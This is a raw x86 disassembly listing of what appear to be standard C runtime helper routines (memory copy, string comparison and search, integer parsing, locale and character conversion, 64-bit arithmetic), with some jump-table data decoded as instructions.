  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
